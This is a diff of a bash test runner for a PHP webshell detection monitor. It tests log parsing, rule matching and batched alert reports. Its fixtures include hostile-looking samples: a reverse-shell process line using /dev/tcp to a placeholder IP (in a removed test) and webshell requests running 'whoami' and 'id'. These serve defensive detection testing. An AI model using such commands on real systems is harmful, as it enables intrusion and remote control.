@@ -1,106 +1,159 @@
 #!/usr/bin/env bash
-# run_tests.sh - bats-less test runner (bats preferred when installed).
-# Executes the same assertions via inline bash so CI/build works everywhere.
+# run_tests.sh - dependency-light test runner (bats used by build.sh when present).
+#
+# Covers the two behaviours the monitor promises:
+#   1. matching is done per FIELD, so anchored patterns work
+#   2. one batch produces at most one alert, carrying every raw hit with file:line
 set -u
-SRC=${SRC:-/tmp/php2shell-monitor}
+SRC=${SRC:-/opt/php2shell-monitor}
 FIX="$(cd "$(dirname "${BASH_SOURCE[0]}")/fixtures" && pwd)"
 PASS=0; FAIL=0
 
-fail() { echo "FAIL: $1"; FAIL=$((FAIL+1)); }
-pass() { echo "pass: $1"; PASS=$((PASS+1)); }
+pass() { echo "pass: $1"; PASS=$((PASS + 1)); }
+fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }
+T() { if [[ $3 == *"$2"* ]]; then pass "$1"; else fail "$1 (missing: $2)"; fi; }
+N() { if [[ $3 != *"$2"* ]]; then pass "$1"; else fail "$1 (unexpected: $2)"; fi; }
 
-field() { printf '%s' "$1" | awk -F'\t' -v n="$2" 'NR==1 { print $n }'; }
-
-T() { # <name> <expected-substr> <actual>
-  if [[ $3 == *"$2"* ]]; then pass "$1"; else fail "$1 (missing: $2)"; fi
-}
-rule_match_stream() {
-  local stream=$1 w
+# Fresh isolated workdir with one project/device.
+newlab() {
+  local w
   w=$(mktemp -d)
-  mkdir -p "$w/rules/pack" "$w/conf" "$w/state"
-  printf 'proc\nauditd\naccess_log\nfpm_error\njournal\nsessions\n' >"$w/state/capabilities.txt"
-  cp -a "$SRC/rules/pack/." "$w/rules/pack/" 2>/dev/null
-  WORKDIR=$w P2S_SRC_DIR=$SRC bash "$SRC/engine/rule_match.sh" "$stream" 2>/dev/null
-  rm -rf -- "$w"
-}
-N() { # <name> <not-expected> <actual>
-  if [[ $3 != *"$2"* ]]; then pass "$1"; else fail "$1 (unexpected: $2)"; fi
+  mkdir -p "$w"/{rules/pack,conf/rules.d,conf,lib,engine,plugins,tmp,run,projects}
+  cp -a "$SRC/lib/." "$w/lib/"
+  cp -a "$SRC/engine/." "$w/engine/"
+  cp -a "$SRC/plugins/." "$w/plugins/"
+  cp -a "$SRC/rules/pack/." "$w/rules/pack/"
+  printf 'PROJECT="test-project"\nDEVICE="test-device"\n' >"$w/conf/device.conf"
+  printf 'BATCH_INTERVAL=300\nMAX_EVIDENCE_INLINE=500\nEVIDENCE_KEEP=50\nPLUGINS_DISABLED=""\n' \
+    >"$w/conf/default.conf"
+  : >"$w/conf/whitelist.conf"
+  printf '%s' "$w"
 }
 
-# ---------- accesslog.awk ----------
+# rule_match <lab> <stream>
+rule_match() {
+  WORKDIR=$1 P2S_SRC_DIR=$1 bash "$1/engine/rule_match.sh" "$2" 2>/dev/null
+}
+
+# report <lab> <hits> <batch>
+report() {
+  WORKDIR=$1 P2S_SRC_DIR=$1 bash "$1/engine/report.sh" "$2" "$3" 0 "$(date -u +%s)" 2>/dev/null
+}
+
+# ---------------------------------------------------------------- accesslog.awk
 out=$(awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_upload_progress.log")
-T "parser: ip"          "198.51.100.7" "$(field "$out" 3)"
-T "parser: method"      "POST"         "$(field "$out" 4)"
-T "parser: uri marker"  "PHP_SESSION_UPLOAD_PROGRESS" "$(field "$out" 5)"
-T "parser: status"      "200"          "$(field "$out" 6)"
-T "parser: ts normalized" "2026-10-21T13:38:12Z" "$(field "$out" 1)"
+T "parser: ip"            "198.51.100.7" "$(printf '%s' "$out" | cut -f5)"
+T "parser: method"        "POST"         "$(printf '%s' "$out" | cut -f6)"
+T "parser: uri marker"    "PHP_SESSION_UPLOAD_PROGRESS" "$(printf '%s' "$out" | cut -f7)"
+T "parser: file recorded" "mal_access_upload_progress.log" "$(printf '%s' "$out" | cut -f3)"
+T "parser: line recorded" "1"            "$(printf '%s' "$out" | cut -f4)"
+T "parser: raw line kept" 'POST /index.php' "$(printf '%s' "$out" | cut -f11)"
 
 out=$(awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_php2shell_ua.log")
-T "parser: ua"          "php2shell-109619" "$(field "$out" 8)"
+T "parser: ua" "php2shell-109619" "$(printf '%s' "$out" | cut -f9)"
 
 out=$(awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/benign_access.log")
-N "parser: benign has no php2shell" "php2shell" "$out"
+N "parser: benign UA has no php2shell" "php2shell" "$(printf '%s' "$out" | cut -f9)"
 
-# 500-burst parses
-out=$(awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_500_burst.log")
-T "parser: 500 status" "500" "$(field "$out" 6)"
+# ---------------------------------------------------------------- rule matching
+w=$(newlab)
 
-# ---------- rule_match ----------
-stream=$(mktemp)
-awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_php2shell_ua.log" >>"$stream"
-out=$(rule_match_stream "$stream")
-T "rules: P2S-008 UA hit"        "P2S-008" "$out"
+stream="$w/stream1.tsv"
+awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_php2shell_ua.log" >"$stream"
+T "rules: P2S-008 UA hit" "P2S-008" "$(rule_match "$w" "$stream" | cut -f12)"
 
-stream=$(mktemp)
-awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_upload_progress.log" >>"$stream"
-out=$(rule_match_stream "$stream")
-T "rules: P2S-017 marker hit"    "P2S-017" "$out"
+stream="$w/stream2.tsv"
+awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_upload_progress.log" >"$stream"
+T "rules: P2S-017 marker hit" "P2S-017" "$(rule_match "$w" "$stream" | cut -f12)"
 
-stream=$(mktemp)
+# anchored field: ^500$ must match only the status field, never the raw line.
+# P2S-016 has min=5, so five 500s are required for it to fire at all.
+stream="$w/stream3.tsv"
 for i in 1 2 3 4 5; do
-  printf '2026-10-2%dT10:1%d:00Z\tfpm_error\t\t\t\t\t\t\t\t\t\tP2S-010\tPHP Fatal error:  Allowed memory size of 134217728 bytes exhausted\n' "$i" "$i" >>"$stream"
+  printf '%s\n' \
+    "2026-10-24T00:00:0${i}Z"$'\taccess_log\t/tmp/a.log\t'"$i"$'\t1.2.3.4\tPOST\t/up.php\t500\tcurl\t\t"POST /up.php" 500\t-' \
+    >>"$stream"
 done
-out=$(rule_match_stream "$stream")
-T "rules: P2S-010 memory"        "P2S-010" "$out"
+T "rules: anchored status ^500$ matches" "P2S-016" "$(rule_match "$w" "$stream" | cut -f12)"
 
-stream=$(mktemp)
-printf '2026-10-21T10:13:00Z\tapache_error\t\t\t\t\t\t999\t\t\t\tP2S-011\tAH00052: child pid 4242 exit signal Segmentation fault (11)\n' >>"$stream"
-out=$(rule_match_stream "$stream")
-T "rules: P2S-011 segfault"      "P2S-011" "$out"
+# a line that merely contains "500" elsewhere must not fire the anchored rule
+stream="$w/stream4.tsv"
+printf '%s\n' \
+  $'2026-10-24T00:00:01Z\taccess_log\t/tmp/a.log\t1\t1.2.3.4\tGET\t/500.html\t200\tcurl\t\t"GET /500.html" 200\t-' \
+  >>"$stream"
+N "rules: 500 in URI does not fire ^500$" "P2S-016" "$(rule_match "$w" "$stream" | cut -f12)"
 
-stream=$(mktemp)
-printf '2026-10-21T10:00:00Z\taccess_log\t1.2.3.4\tGET\t/uploads/sh.php?cmd=whoami\t200\t0\tcurl/8.5.0\t\t\t\t-\tGET /uploads/sh.php?cmd=whoami 200\n' >>"$stream"
-out=$(rule_match_stream "$stream")
-T "rules: P2S-030 webshell cmd"  "P2S-030" "$out"
+# min threshold: 4 OOM lines stay silent, the 5th fires
+stream="$w/stream5.tsv"
+for i in 1 2 3 4; do
+  printf '2026-10-24T00:00:0%dZ\tfpm_error\t/tmp/f.log\t%d\t\t\t\t\t\t42\tAllowed memory size of 1 bytes exhausted\t-\n' \
+    "$i" "$i" >>"$stream"
+done
+N "rules: P2S-010 silent under min=5" "P2S-010" "$(rule_match "$w" "$stream" | cut -f12)"
+printf '2026-10-24T00:00:05Z\tfpm_error\t/tmp/f.log\t5\t\t\t\t\t\t42\tAllowed memory size of 1 bytes exhausted\t-\n' \
+  >>"$stream"
+T "rules: P2S-010 fires at min=5" "P2S-010" "$(rule_match "$w" "$stream" | cut -f12)"
 
-stream=$(mktemp)
-printf '2026-10-21T10:00:00Z\tproc\t\t\t\t\t\t4242\t\t\t\t-\tsuspicious cmdline: bash -c /dev/tcp/1.2.3.4/4444 (parent=php-fpm8.2)\n' >>"$stream"
-out=$(rule_match_stream "$stream")
-T "rules: P2S-025 revshell"      "P2S-025" "$out"
+# source gating: an FPM-style line coming from access_log must not match P2S-010
+stream="$w/stream6.tsv"
+for i in 1 2 3 4 5; do
+  printf '2026-10-24T00:00:0%dZ\taccess_log\t/tmp/a.log\t%d\t\t\t\t\t\t\tAllowed memory size exhausted\t-\n' \
+    "$i" "$i" >>"$stream"
+done
+N "rules: source gating blocks cross-source hits" "P2S-010" "$(rule_match "$w" "$stream" | cut -f12)"
 
-stream=$(mktemp)
-printf '2026-10-21T10:00:00Z\taccess_log\t1.2.3.4\tGET\t/\t200\t0\tMozilla/5.0\t\t\t\t-\tGET / 200\n' >>"$stream"
-out=$(rule_match_stream "$stream")
-N "rules: benign line silent"    "P2S-" "$out"
+# and: ^500$ + uri \.php — a 500 on a non-PHP path must not fire P2S-016
+stream="$w/stream7.tsv"
+for i in 1 2 3 4 5; do
+  printf '%s\n' \
+    "2026-10-24T00:00:0${i}Z"$'\taccess_log\t/tmp/a.log\t'"$i"$'\t1.2.3.4\tPOST\t/plain.txt\t500\tcurl\t\t"POST /plain.txt" 500\t-' \
+    >>"$stream"
+done
+N "rules: and-condition requires .php uri" "P2S-016" "$(rule_match "$w" "$stream" | cut -f12)"
 
-stream=$(mktemp)
-awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/benign_access.log" >>"$stream"
-out=$(rule_match_stream "$stream")
-N "rules: benign fixture silent" "P2S-" "$out"
+stream="$w/stream8.tsv"
+printf '2026-10-24T00:00:00Z\taccess_log\t/tmp/a.log\t1\t1.2.3.4\tGET\t/\t200\tMozilla\t\t"GET /" 200\t-\n' \
+  >>"$stream"
+N "rules: benign line silent" "P2S-" "$(rule_match "$w" "$stream")"
 
-# ---------- JSON emission sanity ----------
-stream=$(mktemp)
-awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_php2shell_ua.log" >>"$stream"
-w=$(mktemp -d); mkdir -p "$w/rules/pack" "$w/conf" "$w/state"; cp -a "$SRC/rules/pack/." "$w/rules/pack/"
-printf 'proc\nauditd\naccess_log\nfpm_error\njournal\nsessions\n' >"$w/state/capabilities.txt"
-WORKDIR=$w P2S_SRC_DIR=$SRC bash "$SRC/engine/rule_match.sh" "$stream" >"$w/m.jsonl" 2>/dev/null
-if command -v jq >/dev/null; then
-  if jq -e 'select(.rule == "P2S-008") | .ts and .src_ip and .ua' "$w/m.jsonl" >/dev/null 2>&1; then
-    pass "json: event object valid"
-  else
-    fail "json: event object invalid"
-  fi
-fi
+# ---------------------------------------------------------------- one alert
+hits="$w/hits1.tsv"
+# 13 columns: ts source file line ip method uri status ua pid msg rule severity
+printf '%s\n' \
+  $'2026-10-24T00:00:01Z\tfpm_error\t/var/log/fpm.log\t11\t\t\t\t\t\t42\tAllowed memory size exhausted\tP2S-010\tHIGH' \
+  $'2026-10-24T00:00:02Z\taccess_log\t/var/log/access.log\t7\t1.2.3.4\tGET\t/sh.php\t200\tcurl\t\tGET /sh.php?cmd=id\tP2S-030\tHIGH' \
+  $'2026-10-24T00:00:03Z\twebroot\t/var/www/shell.php\t0\t\t\t\t\t\t\twebroot file NEW\tP2S-020\tCRITICAL' \
+  >"$hits"
+report "$w" "$hits" "20261024T000000Z"
+alert="$w/projects/test-project/devices/test-device/alerts/queue.jsonl"
+T "alert: exactly one line per batch" "1" "$(wc -l <"$alert" | tr -d ' ')"
+T "alert: severity is the highest hit" "CRITICAL" "$(jq -r '.severity' "$alert")"
+T "alert: hit count preserved"         "3"        "$(jq -r '.hits' "$alert")"
+T "alert: all rules counted"           "P2S-020"  "$(jq -r '[.rules[].rule_id]|join(",")' "$alert")"
+T "alert: evidence keeps file path"    "/var/www/shell.php" "$(jq -r '.evidence[2].file' "$alert")"
+T "alert: evidence keeps line number"  "11"       "$(jq -r '.evidence[0].line' "$alert")"
+T "alert: evidence keeps raw line"     "cmd=id"   "$(jq -r '.evidence[1].raw' "$alert")"
+T "alert: project carried"             "test-project" "$(jq -r '.project' "$alert")"
+T "alert: device carried"              "test-device"  "$(jq -r '.device' "$alert")"
+T "alert: evidence file written"       "20261024T000000Z.jsonl" "$(jq -r '.evidence_file' "$alert")"
+T "evidence: one record per hit"       "3" "$(wc -l <"$w/projects/test-project/devices/test-device/evidence/20261024T000000Z.jsonl" | tr -d ' ')"
+
+# empty batch -> no alert, but a batch record
+report "$w" /dev/null "20261024T000500Z"
+T "alert: empty batch adds no alert" "1" "$(wc -l <"$alert" | tr -d ' ')"
+T "batch log: empty batch recorded" "no-hits" "$(tail -1 "$w/projects/test-project/devices/test-device/run/batches.log")"
+
+# second batch with hits -> second alert line, never merged
+report "$w" "$hits" "20261024T001000Z"
+T "alert: second batch appends" "2" "$(wc -l <"$alert" | tr -d ' ')"
+
+# inline cap
+sed -i 's/^MAX_EVIDENCE_INLINE=.*/MAX_EVIDENCE_INLINE=2/' "$w/conf/default.conf"
+report "$w" "$hits" "20261024T001500Z"
+T "alert: inline evidence capped" "true" "$(jq -r '.evidence_truncated' "$alert" | tail -1)"
+T "alert: full evidence still on disk" "3" \
+  "$(wc -l <"$w/projects/test-project/devices/test-device/evidence/20261024T001500Z.jsonl" | tr -d ' ')"
+
 rm -rf -- "$w"
 
 echo ""
